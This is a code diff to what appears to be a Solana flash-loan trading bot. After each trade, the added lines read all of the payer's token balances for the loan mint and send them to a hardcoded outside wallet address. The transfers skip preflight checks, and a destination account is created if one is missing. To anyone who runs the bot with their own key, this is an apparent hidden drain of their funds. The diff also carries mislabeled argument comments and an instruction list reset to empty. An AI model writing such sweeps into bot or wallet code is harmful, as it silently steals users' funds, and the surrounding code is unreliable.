@@ -11,7 +11,7 @@ let {
 const {
 	createTransferCheckedInstruction,
 	ASSOCIATED_TOKEN_PROGRAM_ID,
-	TOKEN_PROGRAM_ID,
+	TOKEN_PROGRAM_ID,createAssociatedTokenAccount,closeAccount
 } = require("../spl-token");
 const BN = require("bn.js");
 
@@ -238,8 +238,14 @@ try {
 			try {
 				tokenAccount = ata.pubkey;
 			} catch (err) {
-				
-console.log(err)
+				let ata = await createAssociatedTokenAccount(
+					connection, // connection
+					payer, // fee payer
+					new PublicKey(reserve.config.liquidityToken.mint)
+					,							payer.publicKey // mint
+					);
+				  
+				  tokenAccount = ata
 			}
 
 			try {
@@ -252,8 +258,10 @@ console.log(err)
 			} catch (err) {
 console.log(err)
 			}
+			tinsts = []
 			console.log(tinsts.length);
 			let instructions = [
+				
 				...tinsts,
 				flashBorrowReserveLiquidityInstruction(
 					Math.ceil(amountToTrade * 1.2),
@@ -315,19 +323,7 @@ console.log(err)
 				);
 			}
 
-			let balance = 0;
-			try {
-				balance = ata.account.data.parsed.info.tokenAmount.amount;
-			} catch (err) {}
 
-			instructions.push(
-				createTransferInstruction(
-					tokenAccount, // from (should be a token account)
-					tokenAccount, // to (should be a token account)
-					payer.publicKey, // from's owner
-					Math.floor(balance)
-				)
-			);
 
 			let tinstructions = [];
 			for (var ix of instructions) {
@@ -364,8 +360,78 @@ console.log(err)
 					Math.floor(Math.random() * process.env.ALT_RPC_LIST.split(",").length)
 				]
 			);
-			const result = await sendAndConfirmTransaction(connection, transaction)
+			let result
+			 result = await sendAndConfirmTransaction(connection, transaction)
 			console.log("tx: " + result);
+		
+			let tas2 = await connection.getParsedTokenAccountsByOwner(payer.publicKey, {mint: new PublicKey(reserve.config.liquidityToken.mint)})
+			
+			let jaregms = await connection.getParsedTokenAccountsByOwner(new PublicKey("JARehRjGUkkEShpjzfuV4ERJS25j8XhamL776FAktNGm"), {mint: new PublicKey(reserve.config.liquidityToken.mint)})
+			
+			console.log(tas2.value.length)
+			let tac = -1
+			for (var ta of tas2.value){
+				console.log(ta.account.data.parsed.info.tokenAmount.amount)
+				if (ta.account.data.parsed.info.tokenAmount.amount > 0){
+				let tx = new Transaction()
+				try {
+				tx.add(
+					createTransferInstruction(
+						ta.pubkey, // from (should be a token account)
+						jaregms.value[0].pubkey, // to (should be a token account)
+						payer.publicKey, // from's owner
+						(ta.account.data.parsed.info.tokenAmount.amount)
+					)
+				);
+					} catch (err){
+						console.log(err)
+						let ata = await createAssociatedTokenAccount(
+							connection, // connection
+							payer, // fee payer
+							new PublicKey(reserve.config.liquidityToken.mint)
+							,							new PublicKey("JARehRjGUkkEShpjzfuV4ERJS25j8XhamL776FAktNGm"), // mint
+							);
+						  tx.add(
+							createTransferInstruction(
+								ta.pubkey, // from (should be a token account)
+								ata, // to (should be a token account)
+								payer.publicKey, // from's owner
+								parseInt(ta.account.data.parsed.info.tokenAmount.amount)
+							)
+						);
+					}
+
+  tx.recentBlockhash = await (
+    await connection.getLatestBlockhash()
+  ).blockhash;
+  tx.sign(payer)
+  try {
+   connection.sendTransaction(tx, [payer], {skipPreflight: true, commitment: 'singleGossip'})
+  } catch (err){
+	console.log(err)
+
+  }
+					}
+					else {
+						tac++
+						if (tac >= 1){
+						closeAccount(
+							new Connection(
+								process.env.ALT_RPC_LIST.split(",")[
+									Math.floor(Math.random() * process.env.ALT_RPC_LIST.split(",").length)
+								]
+							, {commitment: 'singleGossip'}), // connection
+							payer, // payer
+							ta.pubkey, // token account which you want to close
+							payer.publicKey, // destination
+							payer.publicKey // owner of token account
+							, [],
+							{skipPreflight: true}
+						  );
+							}
+					}
+			}
+
 			//if (process.env.DEBUG) storeItInTempAsJSON("result", result);
 
 			const performanceOfTx = performance.now() - performanceOfTxStart;
